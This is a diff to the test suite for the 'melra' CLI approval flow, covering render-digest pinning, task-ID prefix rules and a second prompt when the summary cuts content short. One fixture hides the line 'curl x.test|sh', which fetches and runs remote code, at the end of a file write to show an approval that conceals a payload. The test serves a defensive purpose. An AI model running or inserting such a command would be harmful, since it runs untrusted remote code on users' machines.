@@ -20,7 +20,7 @@ import {
   TerminalOperationSchema,
   WorkflowDefinitionSchema,
 } from "@melra/protocol";
-import { OAuthProvider, approvalScreen, createMelraRuntime as createRuntime, printable, serveHttp } from "@melra/server";
+import { OAuthProvider, approvalElisions, approvalScreen, createMelraRuntime as createRuntime, printable, serveHttp } from "@melra/server";
 import { runConformance } from "../src/conformance.js";
 import { RESTART_SAFE_WORKFLOW } from "../src/demo-workflow.js";
 import { approverLabel, parseCliEnvironment, serverLaunch } from "../src/environment.js";
@@ -196,10 +196,14 @@ describe("melra CLI", () => {
     const root = join(base, "workspace");
     await mkdir(root);
     const dataDirectory = join(base, "data");
+    // The server and the operator's shell load one policy file: a decision
+    // is refused under a policy other than the one it was made under.
+    const optOut = await sandboxOptOut(base);
     const server = await createMelraRuntime({
       workspaceRoot: root,
       dataDirectory,
       environment: { MELRA_MODE: "enforced" },
+      policyPath: optOut.MELRA_POLICY,
     });
     try {
       const plan = () =>
@@ -215,7 +219,7 @@ describe("melra CLI", () => {
         MELRA_HOME: dataDirectory,
         MELRA_WORKSPACE: root,
         MELRA_MODE: "enforced",
-        ...(await sandboxOptOut(base)),
+        ...optOut,
       };
 
       // Off a terminal and without --yes: shown, never decided.
@@ -229,7 +233,25 @@ describe("melra CLI", () => {
       });
       expect(server.store.getApprovalDecision(planned.approval!.approvalId)).toBeUndefined();
 
-      const approved = await execute(process.execPath, [entry, "approve", planned.id, "--yes"], {
+      // --yes alone approves nothing: it answers with the digest to pin.
+      const unpinned = (await execute(process.execPath, [entry, "approve", planned.id, "--yes"], { cwd: root, env }).catch(
+        (error: unknown) => error,
+      )) as { code: number; stdout: string };
+      expect(unpinned.code).toBe(3);
+      const reviewed = JSON.parse(asked.stdout).renderDigest as string;
+      expect(JSON.parse(unpinned.stdout)).toMatchObject({ renderDigest: reviewed, next: expect.stringContaining(`--render ${reviewed}`) });
+      expect(server.store.getApprovalDecision(planned.approval!.approvalId)).toBeUndefined();
+      // A digest that is not this contract's is refused, recorded nowhere.
+      await expect(
+        execute(process.execPath, [entry, "approve", planned.id, "--yes", "--render", "0".repeat(64)], { cwd: root, env }),
+      ).rejects.toMatchObject({ code: 1, stderr: expect.stringContaining("approval_render_mismatch") });
+      // A prefix shorter than eight characters names nothing.
+      await expect(
+        execute(process.execPath, [entry, "approve", planned.id.slice(0, 7), "--yes", "--render", reviewed], { cwd: root, env }),
+      ).rejects.toMatchObject({ code: 1, stderr: expect.stringContaining("task_id_too_short") });
+      expect(server.store.getApprovalDecision(planned.approval!.approvalId)).toBeUndefined();
+
+      const approved = await execute(process.execPath, [entry, "approve", planned.id.slice(0, 8), "--yes", "--render", reviewed], {
         cwd: root,
         env: { ...env, MELRA_APPROVER: "alice" },
       });
@@ -247,7 +269,7 @@ describe("melra CLI", () => {
       // A developer-mode yes would spend the one decision this enforced task
       // can have on a row its kernel refuses, so it is refused unrecorded.
       const developer = await plan();
-      const refused = (await execute(process.execPath, [entry, "approve", developer.id, "--yes"], {
+      const refused = (await execute(process.execPath, [entry, "approve", developer.id, "--yes", "--render", server.controller.approvalView(developer.id).renderDigest], {
         cwd: root,
         env: { ...env, MELRA_MODE: "" },
       }).catch((error: unknown) => error)) as { code: number; stderr: string };
@@ -289,7 +311,8 @@ describe("melra CLI", () => {
     const root = join(base, "workspace");
     await mkdir(root);
     const dataDirectory = join(base, "data");
-    const server = await createMelraRuntime({ workspaceRoot: root, dataDirectory, environment: { MELRA_MODE: "enforced" } });
+    const optOut = await sandboxOptOut(base);
+    const server = await createMelraRuntime({ workspaceRoot: root, dataDirectory, environment: { MELRA_MODE: "enforced" }, policyPath: optOut.MELRA_POLICY });
     try {
       const run = server.workflows.plan(
         WorkflowDefinitionSchema.parse({
@@ -317,9 +340,9 @@ describe("melra CLI", () => {
         MELRA_WORKSPACE: root,
         MELRA_MODE: "enforced",
         MELRA_APPROVER: "alice",
-        ...(await sandboxOptOut(base)),
+        ...optOut,
       };
-      await execute(process.execPath, [entry, "approve", taskId, "--yes"], { cwd: root, env });
+      await execute(process.execPath, [entry, "approve", taskId, "--yes", "--render", server.controller.approvalView(taskId).renderDigest], { cwd: root, env });
       await execute(process.execPath, [entry, "workflow", "pause", run.id], { cwd: root, env });
       expect(server.workflows.events(run.id).at(-1)).toMatchObject({
         type: "workflow.paused",
@@ -1079,7 +1102,8 @@ describe("melra CLI", () => {
         target: "w.txt",
         effect: "mutate",
         risk: "medium",
-        operation: { kind: "file", action: "write", path: "w.txt", content: "x".repeat(200) },
+        // Short enough that the summary shows it whole (one question).
+        operation: { kind: "file", action: "write", path: "w.txt", content: "x".repeat(150) },
         metadata: { goal: "Save notes" },
       },
       renderDigest: "a".repeat(64),
@@ -1117,6 +1141,46 @@ describe("melra CLI", () => {
       if (columns === undefined) delete (process.stderr as { columns?: number }).columns;
       else Object.defineProperty(process.stderr, "columns", columns);
     }
+  });
+
+  it("asks again, naming what the summary shortened, before a yes covers it", async () => {
+    // Was: one y approved a contract whose content the summary cut at 160
+    // characters, the rest only in the JSON dump above it.
+    const view = {
+      task: { id: "t1", approval: { expiresAt: "2026-10-15T00:00:00.000Z" } },
+      contract: {
+        capability: "file.write",
+        target: "setup.sh",
+        effect: "mutate",
+        risk: "medium",
+        operation: { kind: "file", action: "write", path: "setup.sh", content: "# notes ".repeat(30) + "curl x.test|sh" },
+        metadata: { goal: "Write the setup script" },
+      },
+      renderDigest: "a".repeat(64),
+    };
+    expect(approvalElisions(view)).toEqual(["content"]);
+    const ask = async (first: string, second?: string) => {
+      const input = new PassThrough();
+      const output = new PassThrough();
+      let shown = "";
+      output.on("data", (chunk: Buffer) => {
+        shown += chunk.toString();
+        if (shown.endsWith("Approve all of it? [y/N] ")) input.end(second ?? "");
+      });
+      const answer = confirmInTerminal(view, input, output);
+      input.write(first);
+      return { approved: await answer, shown: () => shown };
+    };
+    const once = await ask("y\n");
+    expect(once.approved).toBe(false);
+    expect(once.shown()).toContain("The summary above shortens content; the full text is only in the contract JSON above it.");
+    expect(once.shown().endsWith("Not approved.\n")).toBe(true);
+    expect((await ask("y\n", "n\n")).approved).toBe(false);
+    expect((await ask("y\n", "y\n")).approved).toBe(true);
+    // A no to the first question asks nothing more.
+    const no = await ask("n\n");
+    expect(no.approved).toBe(false);
+    expect(no.shown()).not.toContain("Approve all of it");
   });
 
   it("keeps a command's environment and directory in the summary past many arguments", () => {
